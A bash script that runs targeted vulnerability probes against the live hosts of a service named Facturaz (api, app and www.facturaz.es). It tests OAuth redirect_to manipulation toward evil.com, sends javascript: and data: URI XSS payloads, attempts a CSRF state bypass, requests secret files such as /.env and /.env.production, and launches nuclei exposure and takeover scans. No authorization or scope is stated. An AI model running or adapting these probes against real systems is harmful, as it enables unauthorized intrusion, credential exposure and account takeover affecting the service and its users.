#!/usr/bin/env bash
# Targeted vuln testing on Facturaz

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

echo "=============================="
echo " VULN SCAN — FACTURAZ"
echo "=============================="

# 1. OAuth callback redirect_uri manipulation
echo ""
echo "[+] OAuth open redirect / redirect_uri manipulation tests..."

# Test: redirect_uri to evil.com
echo "  Test 1: redirect_uri to evil.com"
curl -skL -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=https://evil.com" \
  -o /dev/null -w "  => HTTP %{http_code}, redirect: %{redirect_url}\n" 2>/dev/null

# Test: redirect to evil via callback
echo "  Test 2: callback with state parameter (CSRF token bypass attempt)"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/callback?code=test&state=evil" \
  -o - -w "\n  HTTP: %{http_code}\n" 2>/dev/null | head -c 300
echo ""

# Test: redirect_to with javascript:
echo "  Test 3: redirect_to with javascript: URI"
result=$(curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=javascript:alert(1)" \
  -w "CODE:%{http_code}" -o - 2>/dev/null)
code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 200)
echo "  => [$code] $body"

# Test: redirect_to with data:
echo "  Test 4: redirect_to with data: URI"
result=$(curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=data:text/html,<script>alert(1)</script>" \
  -w "CODE:%{http_code}" -o - 2>/dev/null)
code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 200)
echo "  => [$code] $body"

# 2. Check what OAuth providers are enabled
echo ""
echo "[+] OAuth provider enumeration..."
for provider in google github gitlab microsoft azure twitter facebook apple; do
  result=$(curl -sk -H "User-Agent: $UA" \
    "https://api.facturaz.es/auth/v1/authorize?provider=${provider}" \
    -w "CODE:%{http_code}" -L -o - 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 150 | tr -d '\n')
  echo "  [$code] provider=$provider => $body"
done

# 3. Check www.facturaz.es for source maps, env files
echo ""
echo "[+] Checking www.facturaz.es for exposed files..."
for path in \
  "/robots.txt" "/.env" "/.env.local" "/.env.production" \
  "/sitemap.xml" "/.well-known/security.txt" \
  "/package.json" "/manifest.json" \
  "/_astro/index.js" "/chunk-*.js"; do
  result=$(curl -sk -H "User-Agent: $UA" -o - -w "CODE:%{http_code}" "https://www.facturaz.es${path}" 2>/dev/null)
  code=$(echo "$result" | grep -o 'CODE:[0-9]*' | cut -d: -f2)
  body=$(echo "$result" | sed 's/CODE:[0-9]*$//' | head -c 150 | tr -d '\n')
  if [[ "$code" != "404" && "$code" != "000" && "$code" != "429" ]]; then
    echo "  [$code] $path => $body"
  else
    echo "  [$code] $path"
  fi
done

# 4. Try nuclei on live targets
echo ""
echo "[+] Running nuclei on Facturaz hosts..."
URLS="https://api.facturaz.es
https://app.facturaz.es
https://www.facturaz.es"

echo "$URLS" > /tmp/facturaz-urls.txt

# Use nuclei with exposed-panels, misconfig, takeover templates
/home/hackson/go/bin/nuclei -l /tmp/facturaz-urls.txt \
  -t /home/hackson/nuclei-templates/exposures/ \
  -t /home/hackson/nuclei-templates/misconfiguration/ \
  -t /home/hackson/nuclei-templates/takeovers/ \
  -severity low,medium,high,critical \
  -silent 2>/dev/null || \
/home/hackson/go/bin/nuclei -l /tmp/facturaz-urls.txt \
  -t ~/nuclei-templates/exposures/ \
  -t ~/nuclei-templates/misconfiguration/ \
  -silent 2>/dev/null || \
echo "  (nuclei templates not found at default path — try: nuclei -l /tmp/facturaz-urls.txt -t cves/)"

echo ""
echo "[+] Done."
